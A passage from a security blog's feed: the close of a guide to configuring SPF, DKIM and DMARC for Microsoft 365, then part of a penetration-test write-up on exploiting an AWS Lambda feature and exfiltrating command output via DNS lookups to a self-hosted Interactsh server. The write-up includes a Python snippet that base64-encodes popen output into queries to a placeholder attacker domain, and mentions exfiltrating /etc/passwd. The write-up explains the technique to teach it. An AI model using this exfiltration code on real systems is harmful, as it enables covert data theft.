&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;;; ANSWER SECTION:
acmeldn.onmicrosoft.com. 3508   IN      TXT     &amp;#34;v=spf1 include:spf.protection.outlook.com -all&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Next, we visit the Microsoft Admin Center at &lt;a href=&#34;https://admin.microsoft.com/AdminPortal/Home#/Domains&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://admin.microsoft.com/AdminPortal/Home#/Domains&lt;/a&gt;, where we navigate to the DNS records tab to add records. The DomainGUID is specified just before “&lt;a href=&#34;http://mail.protection.outlook.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;mail.protection.outlook.com&lt;/a&gt;”. With this information, we can now manually add CNAME records to our DNS. The records will look like this:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Hostname: selector1._domainkey
Value: selector1-acmeldn._domainkey.acmeldn.onmicrosoft.com
TTL: 3600Hostname: selector2._domainkey
Value: selector2-acmeldn._domainkey.acmeldn.onmicrosoft.com
TTL: 3600&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/3.png&#34; title=&#34;3&#34; alt=&#34;3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;3&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Next, we can enable DKIM in the Microsoft Defender Security Dashboard (&lt;a href=&#34;https://security.microsoft.com/authentication?viewid=DKIM&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://security.microsoft.com/authentication?viewid=DKIM&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/2.png&#34; title=&#34;2&#34; alt=&#34;2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Et Voila! With our SPF and DKIM records set up and ready for our outgoing email stream, we can now proceed to enable DMARC. DMARC helps us verify unauthenticated usage of our domain email and ensures validation of the &lt;code&gt;From&lt;/code&gt; email field. To accomplish this, we can publish the following TXT record in the Microsoft 365 admin center at &lt;a href=&#34;https://admin.microsoft.com/AdminPortal/Home#/Domains&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://admin.microsoft.com/AdminPortal/Home#/Domains&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Name: _dmarc
Value: v=DMARC1; p=none; pct=100; 
rua=mailto:rua@acmeldn.onmicrosoft.com; 
ruf=mailto:ruf@acmeldn.onmicrosoft.com
TTL: 3600&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/4.png&#34; title=&#34;4&#34; alt=&#34;4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In order to verify our configuration, we can use &lt;a href=&#34;https://dmarcian.com/dmarc-inspector/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://dmarcian.com/dmarc-inspector/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/5.png&#34; title=&#34;5&#34; alt=&#34;5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Endnote &amp;amp; Next steps&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;endnote--next-steps&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#endnote--next-steps&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Once SPF, DKIM, and DMARC have been successfully implemented, it’s crucial to monitor SMTP logs. By carefully investigating these logs, we can pinpoint the reasons why emails are being blocked. Additionally, aggregate and forensic reports provide valuable insights into the numbers and sources of messages that pass or fail the checks.&lt;/p&gt;
&lt;p&gt;The next step involves increasing the DMARC policy to &lt;code&gt;p=quarantine&lt;/code&gt; and monitor the emails. Gradually increasing the &lt;code&gt;pct=&lt;/code&gt; value allows us to verify the fail/pass rate. After some time, we can further enhance security by changing the policy &lt;code&gt;top=reject&lt;/code&gt;. Again, gradual increases in the &lt;code&gt;pct=&lt;/code&gt; rate enable us to monitor for any false positives or email anomalies, leveraging DMARC logs and inspectors mentioned above.&lt;/p&gt;
&lt;p&gt;In short:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;Add the DMARC record &lt;code&gt;v=DMARC1; p=none; pct=100; rua=mailto:rua@example.com; ruf=mailto:ruf@example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;After some time - enable quarantine within the policy &lt;code&gt;v=DMARC1; p=quarantine; pct=100; rua=mailto:rua@example.com; ruf=mailto:ruf@example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Gradually change the &lt;code&gt;pct=&lt;/code&gt; value from 10-100&lt;/li&gt;
&lt;li&gt;After some time - change policy to reject &lt;code&gt;v=DMARC1; p=reject; pct=100; rua=mailto:rua@example.com; ruf=mailto:ruf@example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Gradually change the &lt;code&gt;pct=&lt;/code&gt; value from 10-100&lt;/li&gt;
&lt;li&gt;Test and verify for email deliveries and if legitimate email is rejected by repeating the steps above.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;References:&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/defender-office-365/email-authentication-about&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://learn.microsoft.com/en-us/defender-office-365/email-authentication-about&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.esecurityplanet.com/networks/how-to-set-up-and-implement-dmarc-email-security/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.esecurityplanet.com/networks/how-to-set-up-and-implement-dmarc-email-security/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

      </description>
    </item>
    
    <item>
      <title>What’s in a Name? Writing custom DNS tunnelling protocol, exploiting unexpected AWS Lambda misconfiguration – in a web app Pen test (Part 2)</title>
      <link>//localhost:1313/articles/2024/06/2024-06-13-whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda-misconfiguration-in-a-web-app-pen-test-part-2/</link>
      <pubDate>Thu, 13 Jun 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/06/2024-06-13-whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda-misconfiguration-in-a-web-app-pen-test-part-2/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/unnamed.gif&#34; title=&#34;unnamed&#34; alt=&#34;unnamed&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;unnamed&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In &lt;a href=&#34;https://labs.jumpsec.com/whats-in-a-name-writing-custom-dns-tunnelling-protocol-on-the-fly-exploiting-unexpected-aws-lambda-misconfiguration-all-in-a-web-app-pen-test-part-1/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Part 1&lt;/a&gt; of the series we looked at how an AWS Lambda-powered feature was exploited in a web app penetration test initially leading to RCE and further on with out-of-band data exfiltration via DNS. Though the exact mechanism of achieving remote-code execution with Python was not discussed, we went in depth in how to return data as a result of the code being executed. Initially, with ascii-to-integer encoding I was able to find the username of the runtime user - sbx_userNNN.&lt;/p&gt;
&lt;p&gt;In the first blog post, I spoke of the feature being powered by Lambda rather matter-of-factly, however during the penetration test, the &amp;ldquo;sbx_u&amp;rdquo; string was the first clue that the function I popped was powered by a Lambda.&lt;/p&gt;
&lt;p&gt;Screenshot showing decoding results of whoami:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic1.png&#34; title=&#34;pic1 1&#34; alt=&#34;pic1 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic1 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic2.png&#34; title=&#34;pic2 1&#34; alt=&#34;pic2 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic2 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After proving that RCE worked stably with limited data output in the application UI, I further discovered that although the app did not talk back via HTTP or HTTPS, it was making DNS requests to arbitrary domains. While BurpSuite&amp;rsquo;s Collaborator functionality was working fine for demonstrating proof-of-concept interactions, it presented a couple of problems as I went further:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic8.png&#34; title=&#34;pic8&#34; alt=&#34;pic8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic8&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Scalability &amp;amp; UX - I didn&amp;rsquo;t know at the time, but had vaguely remembered, that the exact data length limit of the DNS protocol was around 255 bytes total - need to RTFM (more detail on this later). But even at this point I knew I could not chuck thousands of bytes into a domain name and ask the poor Lambda to query for us. That meant we needed to split command outputs into multiple chunks at some point. Burp is written in Java and the UI (as seen above) would require manually clicking through hundreds of queries to copy and paste the data for further decoding. I needed a tool that either wrote each query to terminal or append to a file, that I could further decode and process.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Privacy &amp;amp; Cost - Honestly, avoiding manually clicking through hundreds of queries was a good enough reason to not proceed further in Burp. However, at that juncture my concerns also included privacy. If I proceeded further on this attack path, I would potentially be exfiltrating intellectual property of the client via the oastify.com domain, which was shared by all users of Burp Collaborator, including other pentesting providers and potentially cybercriminals. Not that I don&amp;rsquo;t trust PortSwigger as a company, but I don&amp;rsquo;t want to mess up some of the queries on my end and potentially send the encoded data to unknown entities.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A final reason, which may not apply to us, but for those reading this article who are just starting out in Cyber - BurpSuite Collaborator is a paywalled feature and the annual enterprise licensing cost may be prohibitive for many hobbyists or learners.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Moving the antenna to our own infrastructure&lt;span class=&#34;absolute -mt-20&#34; id=&#34;moving-the-antenna-to-our-own-infrastructure&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#moving-the-antenna-to-our-own-infrastructure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;So, is there a private, low-cost / free DNS interaction tool which outputs the log to either the terminal or a file, and works with a domain owned by us? Initially I had fleeting thoughts of spinning up a Bind9 DNS server on a VPS and use a couple of hacked-together shell scripts to do it, but then I thought, man, there are plenty of smart folks in my team who know either this tool or that tool off like the back of their hand, which would serve my specific purpose.&lt;/p&gt;
&lt;p&gt;I asked our techies for help. Initially our developer volunteered to adapt his custom DNS server written in Go for this purpose, but before we could see this big-brain moment through, he had other more pressing matters than pursuing this side quest (a failed motherboard I heard). Then another consultant introduced me to &lt;a href=&#34;https://github.com/projectdiscovery/interactsh&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Interactsh&lt;/a&gt;, an open source tool maintained by ProjectDiscovery, designed to detect out-of-band (OOB) interactions. By default the oast.pro domain (I imagine owned by ProjectDiscovery) is used to catch queries, but one could buy a domain for a couple of bucks and tell the tool to point to it instead.&lt;/p&gt;
&lt;p&gt;Again DNS can be quite complicated if you&amp;rsquo;re not that familiar with the protocol - so I&amp;rsquo;ll briefly explain how the tool works here:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;[vuln app] ---makes DNS query A----&amp;gt; [server]
# then
[client] --ask for records of OOB-----&amp;gt; [server]
[client] &amp;lt;--sends DNS query A details-- [server]&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In part 1 of this series I explained how DNS exfiltration works, so go to the relevant sections if you want a refresher on that. In the case of Interactsh, the &amp;ldquo;central server&amp;rdquo; maintained by ProjectDiscovery would resolve queries pointing towards subdomains of oast.pro. As a bug bounty hunter, you use the interactsh client to connect to the central interactsh server and be given a unique id. Any OOB interaction caught by the server, which matches your unique ID would be sent to your client and be displayed on your terminal. Screenshot below is from the README of the project, showing how the ID matching works.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic9.png&#34; title=&#34;pic9&#34; alt=&#34;pic9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In comparison, shown below is how I set Interactsh up for the engagement. As described in part 1, I needed a domain where we can edit NS and A records. Let&amp;rsquo;s say we own &amp;ldquo;awesome-blogpost.com&amp;rdquo; and I decided to use subdomains of &amp;ldquo;subdomain.awesome-blogpost.com&amp;rdquo; as the query catcher. I spun up a public facing VPS with a static IP address a.b.c.d, pointed the the NS record for the subdomain to it, much like the below (read part 1 if this doesn&amp;rsquo;t make much sense):&lt;/p&gt;
&lt;p&gt;Set an NS record for &lt;code&gt;ns1.awesome-blogpost.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic10.png&#34; title=&#34;pic10&#34; alt=&#34;pic10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic10&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;So we first start our server on the publicly-facing VPS with domain specified and the server CLI would provide you have a client token, which is like a unique password for the client to connect to (says text in the screenshot because &amp;ldquo;text&amp;rdquo; was the actual subdomain I used in the engagement).&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic11.png&#34; title=&#34;pic11&#34; alt=&#34;pic11&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic11&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic12.png&#34; title=&#34;pic12&#34; alt=&#34;pic12&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic12&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then on my local machine, I connect to my server with with the client token and the &lt;code&gt;-dns-only&lt;/code&gt; flag, and you can see a unique URL being provided as a OOB payload. If anything makes a DNS query to &amp;ldquo;cnson… .text.awesome-blogpost.com&amp;rdquo;, my server would catch it and show it to the client.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic13.png&#34; title=&#34;pic13&#34; alt=&#34;pic13&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic13&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;Encoding adventures - weird Python error &amp;amp; RTFM&lt;span class=&#34;absolute -mt-20&#34; id=&#34;encoding-adventures---weird-python-error--rtfm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#encoding-adventures---weird-python-error--rtfm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Before heading off to data encoding and the matter of writing a bootleg encoding protocol, let&amp;rsquo;s first address one thing - DNS is not meant for transmitting arbitrary length messages. I found out the hard way when trying to pipe &lt;code&gt;/etc/passwd&lt;/code&gt; (pentester&amp;rsquo;s favorite!) through the wire - that Python complained of this (on my local testing script):&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Traceback (most recent call last):
  File &amp;#34;/usr/lib/python3.10/encodings/idna.py&amp;#34;, line 163, in encode
    raise UnicodeError(&amp;#34;label empty or too long&amp;#34;)
UnicodeError: label empty or too long&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;To replicate this at home, you can try to run this:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;python3 -c &amp;#39;import socket; longname = &amp;#34;A&amp;#34; * 1000; req = socket.gethostbyname(f&amp;#34;{longname}.example.com&amp;#34;)&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;What happened in that one command was Python being asked to do a DNS request for &amp;ldquo;AAAAA…(1000 of A&amp;rsquo;s)…AAA.example.com&amp;rdquo;. Searching for that error on Google landed me on a &lt;a href=&#34;https://stackoverflow.com/questions/51901399/python-requests-encoding-with-idna-codec-failed-unicodeerror-label-empty-o&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;StackOverflow question&lt;/a&gt; where a dev encountered the same error. A knowledgeable user answered the question explaining that it was actually not a &amp;ldquo;Unicode error&amp;rdquo; but rather a DNS protocol error, implicating the cause being the subdomain within a DNS query being way too long, quote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It seems this is an issue from the &lt;code&gt;socket&lt;/code&gt; module. It fails when the URL&amp;rsquo;s hostname exceeds 64 characters.&lt;/p&gt;
&lt;p&gt;This is still an open issue &lt;a href=&#34;https://bugs.python.org/issue32958&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://bugs.python.org/issue32958&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Digging deeper into the bug report linked, another user wrote, quote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The error can be consistently reproduced when the first substring of the url hostname is greater than 64 characters long, as in &amp;ldquo;0123…..90123.example.com&amp;rdquo;. This wouldn&amp;rsquo;t be a problem, … so the entire &amp;ldquo;[user]:[secret]@XXX&amp;rdquo; section must be less than 65 characters long.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;During the pentest I took the explaination as is because 64-byte limit sounded right, though I actually limited my encoding to 60-byte in total for some imagined &amp;ldquo;leeway&amp;rdquo;. When writing this blog post, I read the &lt;a href=&#34;https://www.rfc-editor.org/rfc/rfc1035&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;RFC1035 for DNS&lt;/a&gt; to confirm this (and say I have RTFM&amp;rsquo;d) and discovered, on page 7, that:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The labels … must start with a letter, end with a letter or digit, and have as interior characters only letters, digits, and hyphen … Labels must be 63 characters or less.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Turns out that those users were slightly wrong in that the maximum subdomain / hostname / label defined by the RFC was actually 63-bytes, not 64. You can verify this with tweaking the &lt;code&gt;longname&lt;/code&gt; variable to 64 and 63 in the Python oneliner above. Knowing that the final messages will be maximally 63-byte chunks definitely helps.&lt;/p&gt;
&lt;p&gt;Next we need to think about other limitations of the DNS protocol. In the RFC we just referenced, it is also stated that a label must consist only of (case-insensitive) letters, digits and hyphen. With the input space (command output i.e. STDOUT) consisting of all printable Ascii, including symbols like &lt;code&gt;%^@*#|/&lt;/code&gt;, &lt;code&gt;space&lt;/code&gt; and &lt;code&gt;newline&lt;/code&gt;, and the output space only consisting of letters, numbers and the unassuming hyphen &lt;code&gt;-&lt;/code&gt;, it is clear that some sort of encoding scheme is needed.&lt;/p&gt;
&lt;p&gt;The solution I came up with was the unassuming Base64 encode. Ideally you would want to encrypt the data with something like AES256 CBC as is the case for &amp;ldquo;production&amp;rdquo; C2 frameworks like Cobalt Strike, but we are dealing with a UAT build so let&amp;rsquo;s just roll with what we have.&lt;/p&gt;
&lt;p&gt;Before dealing with the message length, lets see how I implemented the encoding with the code snippet below - first we read the command output for popen() and encode into UTF-8 (because b64encode takes a byte sequence), then the payload was Base64 encoded, gets back a string with decode(&amp;lsquo;UTF-8&amp;rsquo;), and remove all the trailing &lt;code&gt;=&lt;/code&gt; which might appear in b64 encoding.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;data = popen(&amp;#39;uname -r&amp;#39;).read().encode(&amp;#39;UTF-8&amp;#39;) 
payload = b64encode(data).decode(&amp;#39;utf-8&amp;#39;).replace(&amp;#39;=&amp;#39;,&amp;#39;&amp;#39;)
url = f&amp;#39;http://{payload}..subdomain.awesome-blogpost.com&amp;#39;
lookup = gethostbyname(url)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;On Interactsh, we should get back the encoded output:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;[NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK.&amp;lt;uuid&amp;gt;.subdomain.awesome-blogpost.com.] received DNS interaction from 35....&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Using the &lt;code&gt;base64&lt;/code&gt; cli utility, we would then get back the command output for &lt;code&gt;uname -r&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ echo -n &amp;#39;NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK&amp;#39; | base64 -d
5.10.216-225.855.amzn2.x86_64&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic7.png&#34; title=&#34;pic7&#34; alt=&#34;pic7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
